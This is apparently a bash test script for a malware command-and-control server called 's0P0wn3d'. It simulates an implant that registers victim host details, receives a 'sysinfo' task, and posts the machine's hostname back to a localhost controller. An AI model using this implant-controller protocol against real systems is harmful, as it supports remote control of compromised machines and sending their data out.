#!/bin/bash

# Test C2 Flow - Simule un implant pour tester le système complet

CONTROLLER="http://localhost:8443"

echo "================================"
echo "s0P0wn3d C2 Test Flow"
echo "================================"
echo ""

# 1. Register (simule l'implant qui s'enregistre)
echo "[*] Step 1: Register with controller..."
REGISTER_RESPONSE=$(curl -s -X POST "$CONTROLLER/register" \
  -H "Content-Type: application/json" \
  -d '{
    "encrypted_key": "test_encrypted_key_12345",
    "host_info": {
      "hostname": "TEST-MACHINE",
      "os": "Windows 10",
      "username": "testuser",
      "arch": "x64",
      "ip": "192.168.1.100"
    }
  }')

echo "Response: $REGISTER_RESPONSE"

# Extract session_id
SESSION_ID=$(echo "$REGISTER_RESPONSE" | grep -o '"session_id":"[^"]*' | cut -d'"' -f4)
echo "[+] Session ID: $SESSION_ID"
echo ""

# 2. Send a task (toi, le controller, qui envoie une commande)
echo "[*] Step 2: Send task 'sysinfo'..."
TASK_RESPONSE=$(curl -s -X POST "$CONTROLLER/sessions/$SESSION_ID/task" \
  -H "Content-Type: application/json" \
  -d '{"command":"sysinfo", "args":""}')

echo "Response: $TASK_RESPONSE"
TASK_ID=$(echo "$TASK_RESPONSE" | grep -o '"task_id":"[^"]*' | cut -d'"' -f4)
echo "[+] Task ID: $TASK_ID"
echo ""

# 3. Fetch tasks (simule l'implant qui demande les tâches)
echo "[*] Step 3: Implant fetches tasks..."
TASKS_RESPONSE=$(curl -s -X GET "$CONTROLLER/tasks/$SESSION_ID")

echo "Response: $TASKS_RESPONSE"
echo ""

# 4. Execute task and send results (simule l'implant qui exécute)
echo "[*] Step 4: Simulate task execution and send results..."
RESULT=$(hostname)  # Simule l'exécution de 'sysinfo'

RESULT_RESPONSE=$(curl -s -X POST "$CONTROLLER/results/$SESSION_ID" \
  -H "Content-Type: application/json" \
  -d "{\"task_id\":\"$TASK_ID\",\"status\":\"completed\",\"output\":\"Hostname: $RESULT\"}")

echo "Response: $RESULT_RESPONSE"
echo ""

# 5. Get results (toi, le controller, qui récupère les résultats)
echo "[*] Step 5: Get results from implant..."
RESULTS=$(curl -s -X GET "$CONTROLLER/sessions/$SESSION_ID/results")

echo "Results: $RESULTS"
echo ""

echo "================================"
echo "[+] Test Complete!"
echo "================================"
